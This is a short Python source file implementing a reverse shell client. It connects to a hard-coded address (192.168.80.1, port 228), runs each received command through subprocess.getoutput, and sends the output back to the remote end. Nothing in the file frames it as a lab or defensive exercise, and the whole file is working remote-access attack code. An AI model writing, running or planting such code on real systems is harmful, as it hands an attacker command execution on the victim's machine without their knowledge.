import socket
import subprocess

HOST = '192.168.80.1'
PORT = 228

def client() -> None:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    while True:
        command = s.recv(1024).decode()
        
        if command.lower() == 'exit':
            break
        
        output = subprocess.getoutput(command)
        s.send(output.encode())
        
    s.close()

if __name__ == '__main__':
    client()